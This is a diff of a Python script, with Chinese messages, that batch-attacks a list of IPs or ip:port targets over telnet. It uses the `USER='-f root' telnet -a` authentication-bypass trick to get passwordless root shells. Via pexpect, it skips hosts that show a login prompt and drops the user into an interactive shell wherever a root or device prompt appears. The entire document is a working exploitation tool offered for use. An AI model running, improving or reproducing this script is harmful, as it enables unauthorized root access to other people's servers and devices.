@@ -1,79 +1,123 @@
 #!/usr/bin/env python3
-import subprocess
 import os
 import sys
 import time
 import socket
+import pexpect
 
-# 配置部分：存放IP地址的文件名
-IP_FILE = "ip_list.txt"
-# 连接超时时间（秒）
-CONNECT_TIMEOUT = 7
+IP_FILE = "ip_list.txt"   
+CONNECT_TIMEOUT = 7       
+SESSION_TIMEOUT = 12      
 
 def get_ips(filename):
+
     if not os.path.exists(filename):
-        print(f"错误: 找不到文件 '{filename}'，请先创建该文件并填入IP地址。")
+        print(f"错误: 找不到文件 '{filename}'，请先创建该文件。")
         sys.exit(1)
-    ips = []
+    
+    targets = []
     try:
         with open(filename, 'r') as f:
             for line in f:
-                ip = line.strip()
-                if ip and not ip.startswith('#'):
-                    ips.append(ip)
+                line = line.strip()
+                if line and not line.startswith('#'):
+                    if ':' in line:
+                        try:
+                            ip, port = line.split(':')
+                            targets.append((ip, int(port)))
+                        except ValueError:
+                            print(f"[!] 警告: 无法解析行 '{line}'，请确保格式为 ip:port")
+                    else:
+                        targets.append((line, 23))
     except Exception as e:
         print(f"读取文件失败: {e}")
         sys.exit(1)
-    return ips
+    return targets
 
-def check_connectivity(ip, port=23, timeout=7):
+def check_connectivity(ip, port, timeout=7):
+    """
+    检测指定 IP 和端口的连通性
+    """
     try:
-        print(f"[*] 正在检测 {ip}:{port} 连通性 (超时 {timeout}秒)...")
+        print(f"[*] 正在检测 {ip}:{port} 连通性...")
         with socket.create_connection((ip, port), timeout=timeout):
             return True
-    except socket.timeout:
-        print(f"[-] 连接超时: {ip}")
-        return False
-    except (ConnectionRefusedError, OSError) as e:
-        print(f"[-] 连接被拒绝或不可达: {ip} ({e})")
-        return False
-    except Exception as e:
-        print(f"[-] 检测发生未知错误: {e}")
+    except Exception:
+        print(f"[-] 端口 {port} 未开放或无法触达: {ip}")
         return False
 
-def run_telnet_session(ip):
-
-    if not check_connectivity(ip, timeout=CONNECT_TIMEOUT):
-        print(f"[-] 跳过 IP: {ip}")
+def run_telnet_session(ip, port):
+    """
+    建立 Telnet 会话
+    """
+    if not check_connectivity(ip, port, timeout=CONNECT_TIMEOUT):
         return
-    command_str = f"env USER='-f root' telnet -a {ip}"
-    print(f"\n{'='*30}")
-    print(f"连接成功: {ip}")
-    print(f"{'='*30}")
-    print("提示: 操作完毕后输入 'exit' 来退出。")
-    print("注意！！！若出现I don't hear you! 请输入ctrl+] 和 exit 来跳过这个ip")
+
+    command_str = f"env USER='-f root' telnet -a {ip} {port}"
+    print(f"\n{'='*40}")
+    print(f"正在尝试建立 Telnet 会话: {ip}:{port}")
+    print(f"{'='*40}")
+
     try:
-        subprocess.call(command_str, shell=True)
+        child = pexpect.spawn(command_str, encoding='utf-8', timeout=SESSION_TIMEOUT)
+        
+        patterns = [
+            "I don't hear you!",   # 0
+            "login:",               # 1
+            "Password:",           # 2
+            "Username:",           # 3
+            "#",                   # 4
+            ">",                   # 5
+            pexpect.TIMEOUT,       # 6
+            pexpect.EOF            # 7
+        ]
+
+        index = child.expect(patterns)
+
+        if index in [0, 1, 2, 3]:
+            print(f"[-] 检测到登录/异常提示 '{patterns[index]}'，正在自动跳过...")
+            child.close(force=True)
+            return
+
+        elif index in [4, 5]:
+            print(f"[+] 连接成功!")
+            print(">>> 进入交互模式! (退出请输入 'exit')")
+            print("直接可执行系统命令即可（whoami等等）")
+            child.interact()
+            print(f"\n[*] 交互已结束。")
+
+        elif index == 6:
+            print(f"[-] 响应超时：在 {SESSION_TIMEOUT} 秒内未获得有效响应。")
+            child.close(force=True)
+
+        else:
+            print(f"[-] 连接已意外中断 (EOF)。")
+            child.close()
+
     except KeyboardInterrupt:
-        print("\n\n[!] 用户中断，脚本停止运行。")
-        sys.exit(1)
+        print("\n\n[!] 用户中断脚本。")
+        sys.exit(0)
+    except Exception as e:
+        print(f"[-] 运行出错: {e}")
 
 def main():
     target_file = sys.argv[1] if len(sys.argv) > 1 else IP_FILE
-    ip_list = get_ips(target_file)
-    if not ip_list:
-        print("文件中没有找到有效的IP地址。")
+    target_list = get_ips(target_file)
+    
+    if not target_list:
+        print("文件中没有找到有效的目标（IP 或 IP:Port）。")
         return
-    print(f"共加载 {len(ip_list)} 个IP地址，准备依次执行 (连接超时设置: {CONNECT_TIMEOUT}秒)...")
-    for index, ip in enumerate(ip_list, 1):
-        print(f"\n### 进度: {index}/{len(ip_list)} ###")
-        run_telnet_session(ip)
+
+    total = len(target_list)
+    print(f"共加载 {total} 个目标，准备依次执行...")
+
+    for index, (ip, port) in enumerate(target_list, 1):
+        print(f"\n[ 进度: {index}/{total} ] 当前目标: {ip}:{port}")
+        run_telnet_session(ip, port)
         
-        print(f"[-] {ip} 会话已结束，等待 1 秒后继续...")
         time.sleep(1)
-    print("\n[+] 所有IP已执行完毕。")
+
+    print("\n[+] 任务清单处理完毕。")
 
 if __name__ == "__main__":
     main()
-
-
